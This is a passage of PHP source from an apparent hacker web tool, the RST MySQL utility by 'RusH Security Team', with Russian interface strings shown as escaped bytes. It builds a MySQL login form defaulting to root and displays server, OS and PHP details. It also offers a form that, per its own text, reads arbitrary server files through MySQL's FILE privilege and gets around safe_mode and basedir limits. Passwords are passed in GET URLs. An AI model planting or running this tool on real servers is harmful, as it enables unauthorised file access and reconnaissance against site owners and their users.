f\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xee\xe3\xee&nbsp;\xf4\xe0\xe9\xeb\xe0,&nbsp;\xf1\xe5\xf0\xe2\xe5\xf0\xe0&nbsp;(&nbsp;<b>$server</b>&nbsp;)</td></tr>\n        <tr><td>\n        <table cellpadding=5 cellspacing=1 bgcolor=#FFFFFF border=0>\n        <tr bgcolor=#DBDCDD><td align=center>\n        \xcf\xf0\xe8 \xf3\xf1\xeb\xee\xe2\xe8\xe8, \xf7\xf2\xee \xf4\xe0\xe9\xeb \xe4\xee\xf1\xf2\xf3\xef\xe5\xed \xe4\xeb\xff <b>\xf7\xf2\xe5\xed\xe8\xff</b> \xe8 \xef\xf0\xe8\n        \xed\xe0\xeb\xe8\xf7\xe8\xe8 \xf3 \xef\xee\xeb\xfc\xe7\xee\xe2\xe0\xf2\xe5\xeb\xff \xef\xf0\xe8\xe2\xe8\xeb\xe5\xe3\xe8\xe8 <b>FILE</b>, <b>SELECT</b>,\n        <b>CREATE</b>, \xef\xf0\xe0\xe2\xe8\xeb\xfc\xed\xee\xec \xef\xf3\xf2\xe8 \xe8 \xe8\xec\xe5\xed\xe8 - \xe2\xee\xe7\xec\xee\xe6\xed\xee \xf7\xf2\xe5\xed\xe8\xe5 \xef\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xee\xe3\xee \xf4\xe0\xe9\xeb\xe0.\n        \xce\xe1\xf5\xee\xe4 \xee\xe3\xf0\xe0\xed\xe8\xf7\xe5\xed\xe8\xe9 \xef\xf0\xe8 <b>safe_mode</b> \xe8 <b>safe_basedir</b>\n        </td></tr></table></td></tr>\n        <form method=\\"get\\" action=\\"$self?f=x_file\\">\n        <input type=\\"hidden\\" name=\\"s\\" value=\\"$s\\">                \n        <input type=\\"hidden\\" name=\\"server\\" value=\\"$server\\">\n        <input type=\\"hidden\\" name=\\"port\\" value=\\"$port\\">\n        <input type=\\"hidden\\" name=\\"login\\" value=\\"$login\\">\n        <input type=\\"hidden\\" name=\\"passwd\\" value=\\"$passwd\\">\n        <tr><td align=center><br>\xcf\xee\xeb\xed\xfb\xe9 \xef\xf3\xf2\xfc \xea \xf4\xe0\xe9\xeb\xf3: <input type=\\"text\\" name=\\"p_file\\" value=\\"$p_v\\" size=\\"40\\">&nbsp;&nbsp;&nbsp;&nbsp;\n        <input type=\\"submit\\" value=\\"\xef\xee\xea\xe0\xe7\xe0\xf2\xfc \xf4\xe0\xe9\xeb\\">&nbsp;&nbsp;&nbsp;&nbsp;</td></tr></table><br>";\n\n$start_form="<br>\n<table align=center border=0 width=100% cellpadding=2 cellspacing=0 bgcolor=#FFFFFF>\n <tr>\n   <td>\n<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#000000>\n<tr><td>\n      <table background=".$self."?img=bg_f border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>\n         <tr>\n            ".$global_header."\n            <td width=33% align=right>\n                ".date ("j-F-Y g:i")."&nbsp;&nbsp;\n            </td>\n         </tr>\n      </table> \n</td></tr>\n</table>\n\n</td></tr>\n<tr><td>\n\n<table align=center border=0 width=80% cellpadding=2 cellspacing=0 bgcolor=#FFFFFF>\n <tr>\n   <td bgcolor=#DBDCDD valign=top width=200><br>\n        <center><b>\xd3\xf2\xe8\xeb\xe8\xf2\xe0 \xe4\xeb\xff \xf0\xe0\xe1\xee\xf2\xfb \xf1 MySQL</b></center><hr width=98%>\n        <li>\xcf\xf0\xee\xf1\xec\xee\xf2\xf0 \xe1\xe0\xe7 \xe8 \xf2\xe0\xe1\xeb\xe8\xf6.</li>\n        <li>\xcf\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xfb\xe5 \xe7\xe0\xef\xf0\xee\xf1\xfb \xea \xc1\xc4.</li>\n        <li>\xd0\xe5\xe4\xe0\xea\xf2\xe8\xf0\xee\xe2\xe0\xed\xe8\xe5 \xe1\xe0\xe7 \xe8 \xf2\xe0\xe1\xeb\xe8\xf6.</li>\n        <li>\xc4\xe0\xec\xef\xfb \xc1\xc4 \xe8\xeb\xe8 \xf2\xe0\xe1\xeb\xe8\xf6.</li>\n\t\t<hr width=98%>\n        Type - FREE<br>\n        Home page: <a href=http://rst.void.ru><b>http://rst.void.ru</b></a><br />\n\t\tMod by: <a href=\'http://artofhack.kz\'><b>http://artofhack.kz</b></a>\n   </td>\n   <td background=".$self."?img=st_form_bg bgcolor=#E6E7E9><center><font size=2>\n        <br>\xc4\xeb\xff \xf1\xee\xe5\xe4\xe8\xed\xe5\xed\xe8\xff \xf1 \xf1\xe5\xf0\xe2\xe5\xf0\xee\xec MySQL \xe2\xe2\xe5\xe4\xe8\xf2\xe5 <b>\xc8\xcc\xdf</b>, <b>\xcf\xc0\xd0\xce\xcb\xdc</b> (\xef\xee\xeb\xfc\xe7\xee\xe2\xe0\xf2\xe5\xeb\xff MySQL) \xe8 \xe8\xec\xff <b>\xd5\xce\xd1\xd2\xc0</b>.</font></center><br>\n        <li>\xc5\xf1\xeb\xe8 \xeb\xee\xe3\xe8\xed \xfe\xe7\xe5\xf0\xe0 mysql \xed\xe5 \xf3\xea\xe0\xe7\xe0\xed \xff\xe2\xed\xee, \xef\xee \xf3\xec\xee\xeb\xf7\xe0\xed\xe8\xfe \xef\xee\xe4\xf1\xf2\xe0\xe2\xeb\xff\xe5\xf2\xf1\xff \xe8\xec\xff \xe2\xeb\xe0\xe4\xe5\xeb\xfc\xf6\xe0 \xef\xf0\xee\xf6\xe5\xf1\xf1\xe0.</li>\n        <li>\xc5\xf1\xeb\xe8 \xef\xe0\xf0\xee\xeb\xfc \xfe\xe7\xe5\xf0\xe0 mysql \xed\xe5 \xf3\xea\xe0\xe7\xe0\xed \xff\xe2\xed\xee, \xef\xee \xf3\xec\xee\xeb\xf7\xe0\xed\xe8\xfe \xef\xee\xe4\xf1\xf2\xe0\xe2\xeb\xff\xe5\xf2\xf1\xff \xef\xf3\xf1\xf2\xee\xe9 \xef\xe0\xf0\xee\xeb\xfc.</li>\n        <li>\xc5\xf1\xeb\xe8 \xe8\xec\xff \xf1\xe5\xe2\xf0\xe2\xe5\xf0\xe0 mysql \xed\xe5 \xf3\xea\xe0\xe7\xe0\xed\xee \xff\xe2\xed\xee, \xef\xee \xf3\xec\xee\xeb\xf7\xe0\xed\xe8\xfe \xef\xee\xe4\xf1\xf2\xe0\xe2\xeb\xff\xe5\xf2\xf1\xff <b>localhost</b></li>\n        <li>\xc5\xf1\xeb\xe8 \xef\xee\xf0\xf2 \xe4\xeb\xff \xf1\xe5\xe2\xf0\xe2\xe5\xf0\xe0 mysql \xed\xe5 \xf3\xea\xe0\xe7\xe0\xed \xff\xe2\xed\xee, \xef\xee\xe4\xf1\xf2\xe0\xe2\xeb\xff\xe5\xf2\xf1\xff  \xef\xee\xf0\xf2 \xef\xee \xf3\xec\xee\xeb\xf7\xe0\xed\xe8\xfe, \xee\xe1\xfb\xf7\xed\xee (<b>3306</b>)<br><br></li>\n        <center>\xc2\xe5\xf0\xf1\xe8\xff PHP (<b>".phpversion()."</b>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ID PHP script (<b>".get_current_user( )."</b>)</center>\n        <br><table align=center>\n        <tr><td>\xe8\xec\xff \xfe\xe7\xe5\xf0\xe0 MySQL</td><td align=right>\xef\xe0\xf0\xee\xeb\xfc \xfe\xe7\xe5\xf0\xe0 MySQL&nbsp;</td></tr>\n        <form method=\\"get\\" action=\\"$self\\">\n        <input type=\\"hidden\\" name=\\"s\\" value=\\"y\\">\n        <tr>\n          <td><input type=\\"text\\" name=\\"login\\" value=\\"root\\" maxlength=\\"64\\"></td>\n          <td align=right><input type=\\"text\\" name=\\"passwd\\" value=\\"$passwd\\" maxlength=\\"64\\"></td>\n        </tr>\n        <tr><td>\xd1\xe5\xf0\xe2\xe5\xf0 MySQL</td><td>\xef\xee\xf0\xf2</td></tr>\n        <tr>                \n          <td><input type=\\"text\\" name=\\"server\\" value=\\"localhost\\" maxlength=\\"64\\"></td>\n          <td><input type=\\"text\\" name=\\"port\\" value=\\"3306\\" maxlength=\\"6\\" size=\\"3\\">\n          <input type=\\"submit\\" value=\\"\xef\xee\xe4\xea\xeb\xfe\xf7\xe8\xf2\xfc\xf1\xff\\"></td>\n        </tr></table><br>        \n   </td>\n </tr>\n</table>\n\n</td></tr>\n<tr><td>\n<table align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#000000>\n<tr><td>\n      <table background=".$self."?img=bg_f align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>\n         <tr>\n            <td align=center>\n                &copy;RusH Security Team (coded by dinggo, Modified by AOH)<br />\n            </td>\n         </tr>\n      </table> \n</td></tr>\n</table>\n</td></tr></table>\n";\n\nif ($os ==\'win\') {\n$os="OS - <b>".$_ENV["OS"]."</b>";\n}else{\n   $str_k=$_ENV["BOOT_FILE"];\n   $k=preg_replace ("/[a-zA-Z\\/]/","", $str_k);\n   $os="OS\\Kernel: <b>".$_ENV["BOOT_IMAGE"].$k."</b>";\n\n}\n\nif (!isset($s) || $_GET[\'s\'] != \'y\') { print $start_form;\n $serv = array(127,192,172,10);\n $adrr=@explode(\'.\', $_SERVER["SERVER_ADDR"]);\n //if (!in_array($adrr[0], $serv)) {\n   //\xef\xf0\xe8 \xef\xee\xff\xe2\xeb\xe5\xed\xe8\xe8 \xed\xee\xe2\xee\xe9 \xe2\xe5\xf0\xf1\xe8\xe8 \xf3\xf2\xe8\xeb\xe8\xf2\xfb \xef\xee\xea\xe0\xe6\xe5\xec \xf7\xf2\xee \xe4\xee\xf1\xf2\xf3\xef\xed\xe0\n   //\xed\xee\xe2\xe0\xff \xe2\xe5\xf0\xf1\xe8\xff \xe8 \xef\xf0\xe5\xe4\xeb\xee\xe6\xe8\xec \xe7\xe0\xe3\xf0\xf3\xe7\xe8\xf2\xfc \xe5\xe5 \xf1 \xf1\xe0\xe9\xf2\xe0\n   //@print "<img src=\\"http://rst.void.ru/version_sql/version.php\\" border=0 height=0>";\n   //@readfile ("http://rst.void.ru/version_sql/version.php");  \n //}\nexit;\n}\n\nif (isset($server)&&isset($port)&&isset($login)&&isset($passwd)){\n $connection = mysql_connect($server.":".$port, $login, $passwd) or die("$header<table align=center width=80% bgcolor=red><tr><br>\xce\xf8\xe8\xe1\xea\xe0 \xf1\xee\xe5\xe4\xe8\xed\xe5\xed\xe8\xff \xf1 MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xee\xec <b>$server</b><td><center><font size=2><b>".mysql_error()."</b></font></center><br><b>\xc2\xe5\xf0\xee\xff\xf2\xed\xfb\xe5 \xee\xf8\xe8\xe1\xea\xe8:</b><li>\xcd\xe5 \xef\xf0\xe0\xe2\xe8\xeb\xfc\xed\xfb\xe9 \xe0\xe4\xf0\xe5\xf1 \xf1\xe5\xf0\xe2\xe5\xf0\xe0 <b>$server</b><li>\xcd\xe5 \xef\xf0\xe0\xe2\xe8\xeb\xfc\xed\xfb\xe9 \xed\xee\xec\xe5\xf0 \xef\xee\xf0\xf2\xe0 <b>$port</b><li>\xcd\xe5 \xe2\xe5\xf0\xed\xee\xe5 \xe8\xec\xff (login) \xfe\xe7\xe5\xf0\xe0 mysql <b>$login</b><li>\xcd\xe5 \xe2\xe5\xf0\xed\xfb\xe9 \xef\xe0\xf0\xee\xeb\xfc (password) \xfe\xe7\xe5\xf0\xe0 mysql <b>$passwd</b><li>\xc4\xee\xf1\xf2\xf3\xef \xea \xf1\xe5\xf0\xe2\xe5\xf0\xf3 $server \xe7\xe0\xef\xf0\xe5\xf9\xe5\xed \xf1 \xe0\xe4\xf0\xe5\xf1\xe0 <b>".getenv(\'REMOTE_ADDR\')."</b><li>\xd3\xe4\xe0\xeb\xe5\xed\xed\xfb\xe9 \xf1\xe5\xf0\xe2\xe5\xf0 \xe2\xf0\xe5\xec\xe5\xed\xed\xee \xed\xe5 \xe4\xee\xf1\xf2\xf3\xef\xe5\xed</td></tr></table><br></td></tr></table><script>alert(\'\xcd\xe5 \xe2\xee\xe7\xec\xee\xe6\xed\xee \xf3\xf1\xf2\xe0\xed\xee\xe2\xe8\xf2\xfc \xf1\xee\xe5\xe4\xe8\xed\xe5\xed\xe8\xe5 \xf1 MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xee\xec $server \\\\n\\\\n \xcf\xf0\xee\xe2\xe5\xf0\xfc\xf2\xe5 \xef\xf0\xe0\xe2\xe8\xeb\xfc\xed\xee\xf1\xf2\xfc \xe2\xf5\xee\xe4\xff\xf9\xe8\xf5 \xe4\xe0\xed\xed\xfb\xf5:\\\\n\\\\n\xf1\xe5\xf0\xe2\xe5\xf0 $server\\\\n\xef\xee\xf0\xf2 $port\\\\n\xe8\xec\xff $login\\\\n\xef\xe0\xf0\xee\xeb\xfc $passwd\');</script><head><META HTTP-EQUIV=\'Refresh\' CONTENT=\'0;url=$self\'></head>");\n$mysql_version = mysql_get_server_info($connection);\n}\n\n$form_ad_b="<br>\n<table width=80% align=center border=0 cellpadding=0 cellspacing=1 bgcolor=#FFFFFF> \n <tr>\n   <td>\n   <table width=100% align=center border=0 cellpadding=4 cellspacing=0 bgcolor=#DBDCDD> \n    <td>\n      MySQL: <b>$server</b><br />\n\t  Ver: <b>$mysql_version</b>\n   </td>\n   <td align=center>\n      <b>".$_SERVER["SERVER_SOFTWARE"]."</b>\n   </td>\n   <td align=right>\n      \xc2\xe5\xf0\xf1\xe8\xff PHP (<b>".phpversion()."</b>) $php_type\n   </td>\n </tr>\n <tr bgcolor=#DBDCDD>\n   <td>\n      IP:<b>".$_SERVER["SERVER_ADDR"]."</b> Name:<b>".$_SERVER["SERVER_NAME"]."</b>\n   </td>\n   <td align=center>\n      ID PHP script (<b>".get_current_user( )."</b>)\n   </td>\n   <td align=right>\n    $os\n   </td>\n </tr>\n </table>\n</td></tr></table>\n<table width=80% align=center border=0 cellpadding=5 cellspacing=1> \n <tr>\n   <td>\n        <a href=\\"$self?s=$s&stat=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\\"><b>\xd1\xf2\xe0\xf2\xe8\xf1\xf2\xe8\xea\xe0 MySQL</b></a>\n   </td>\n   <td align=center>\n        <a href=\\"$self?s=$s&php=ok&_login=$login&_passwd=$passwd&_server=$server&_port=$port\\" target=\\"_blank\\"><b>\xc8\xed\xf4\xee\xf0\xec\xe0\xf6\xe8\xff PHP (ALL)</b></a>\n   </td>\n   <td align=right>\n        <a href=\\"$self?s=$s&proc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\\"><b>\xcf\xf0\xee\xf6\xe5\xf1\xf1\xfb MySQL </b></a>\n   </td>\n </tr>\n <tr>\n   <td>\n        <a href=\\"$self?s=$s&apc=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\\"><b>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 Apache </b></a>\n   </td>\n   <td align=center>\n        <a href=\\"$self?s=$s&var=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\\"><b>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 MySQL </b></a> \n   </td>\n   <td align=right>\n        <a href=\\"$self?s=$s&f=x_file&login=$login&passwd=$passwd&server=$server&port=$port\\" title=\\"\xcf\xf0\xee\xf1\xec\xee\xf2\xf0 \xef\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xee\xe3\xee \xf4\xe0\xe9\xeb\xe0 \xf1\xe5\xf0\xe2\xe5\xf0\xe0 \xe4\xe0\xe6\xe5 \xef\xf0\xe8 \xe2\xea\xeb\xfe\xf7\xe5\xed\xee\xec safe_mode \xe8 safe_mode_exec_dir\\"><b>\xd4\xe0\xe9\xeb *?</b></a>\n   </td>\n </tr>\n</table><br>\n\n<table width=300 align=center cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>\n<tr bgcolor=#DBDCDD><td>\n<table align=center cellpadding=0 cellspacing=0>\n <tr bgcolor=#DBDCDD>\n   <td> <table cellpadding=4><tr><td><b>\xd1\xee\xe7\xe4\xe0\xf2\xfc \xed\xee\xe2\xf3\xfe \xe1\xe0\xe7\xf3 \xe4\xe0\xed\xed\xfb\xf5</b></td></tr><tr><td>\n        <form method=\\"get\\" action=\\"$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\\">\n        <input type=\\"hidden\\" name=\\"s\\" value=\\"$s\\">\n        <input type=\\"hidden\\" name=\\"server\\" value=\\"$server\\">\n        <input type=\\"hidden\\" name=\\"port\\" value=\\"$port\\">\n        <input type=\\"hidden\\" name=\\"login\\" value=\\"$login\\">\n        <input type=\\"hidden\\" name=\\"passwd\\" value=\\"$passwd\\">\n        <input type=\\"text\\" name=\\"new_db\\" value=\\"\\" maxlength=\\"64\\">\n        <input type=\\"submit\\" value=\\"\xf1\xee\xe7\xe4\xe0\xf2\xfc\\"></form></td>\n        </tr></table>\n   </td>\n </tr>\n</table>\n</td>    \n</tr></table>\n\n<table width=80% align=center border=0 cellpadding=0>\n <tr align=right>\n   <td width=85%></td>\n   <td width=15>\n    <a href=$self><img src=".$self."?img=b_close border=0 title=close></a>\n  </td>\n </tr>\n</table>\n";\n//$cnt_b=mysql_num_rows(mysql_list_dbs());  // \xea\xee\xeb-\xe2\xee \xe1\xe0\xe7 mysql \xf1\xe5\xf0\xe2\xe5\xf0\xe0  \nprint "\n<table align=center border=0 width=100% cellpadding=1 cellspacing=0 bgcolor=#FFFFFF>\n <tr>\n   <td>\n<table align=center width=100% cellpadding=0 cellspacing=1 bgcolor=#000000>\n<tr><td>\n      <table background=".$self."?img=bg_f border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#C2C2C2>\n         <tr>\n\t\t\t".$global_header."\n            <td width=33% align=center>\n                <font color=blue><b>$server</b></font><b>&nbsp;[CONNECTION OK]</b>\n            </td>\n            <td width=33% align=right>\n                ".date ("j-F-Y g:i")."&nbsp;&nbsp;\n            </td>\n         </tr>\n      </table> \n</td></tr>\n</table>\n\n</td></tr>\n<tr><td>\n\n<table background=".$self."?img=send_img align=center border=0 width=100% cellpadding=0 cellspacing=0 bgcolor=#FFFFFF>\n <tr>\n   <td bgcolor=#DBDCDD valign=top width=170>";\n\n/*---------------------- L E F T   B L O C K (menu bd)! -------------------*/\n/*\xcf\xee\xea\xe0\xe7\xe0\xf2\xfc \xe2\xf1\xe5 \xe1\xe0\xe7\xfb \xf1\xe5\xf0\xe2\xe5\xf0\xe0*/\nif ($connection&&!iss